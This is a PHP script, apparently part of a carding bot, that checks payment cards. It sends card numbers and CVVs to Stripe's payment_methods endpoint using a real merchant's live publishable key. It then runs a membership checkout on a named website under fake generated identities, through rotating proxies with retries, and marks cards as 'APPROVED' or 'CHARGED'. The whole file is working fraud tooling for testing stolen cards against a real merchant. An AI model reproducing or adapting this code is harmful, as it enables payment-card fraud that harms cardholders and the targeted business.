<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$data = 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F7ad74329b%3B+stripe-js-v3%2F7ad74329b&time_on_page='.rand(50000, 100000).'&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1EcLwRGZTWsKQM75';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/payment_methods', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id, $json_r1->card->brand)) goto start;

$pm = $json_r1->id;
$CardType = $json_r1->card->brand;

$data = 'level=1&checkjavascript=1&username='.$fake->user.'&password=pass&password2=pass&first_name='.$fake->first.'&last_name='.$fake->last.'&bemail='.urlencode($fake->email).'&bconfirmemail='.urlencode($fake->email).'&fullname=&gateway=stripe&CardType='.$CardType.'&tos=1&submit-checkout=1&javascriptok=1&submit-checkout=1&javascriptok=1&payment_method_id='.$pm.'&AccountNumber=XXXXXXXXXXXX'.$last4.'&ExpirationMonth='.$mm.'&ExpirationYear='.$yyyy;

$r2 = $this->curlx->Post('https://www.dharmaworldwide.com/membership-account/membership-checkout/', $data, null, null, $server['proxy']);

if (!$r2->success || empty($r2->body)) goto start;

if (strpos($r2->body, 'Welcome! If this is your first time on the new') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CHARGED - Thank you for joining!"];

	goto end;
}

$err = trim(strip_tags(str_replace(['Error updating default payment method.', 'Error creating customer record with Stripe:'], '', $this->getstr($this->getstr($r2->body, 'class="pmpro_message', '/'), '>', '<'))));

$status = $this->response->Stripe($r2->body, $err);

end: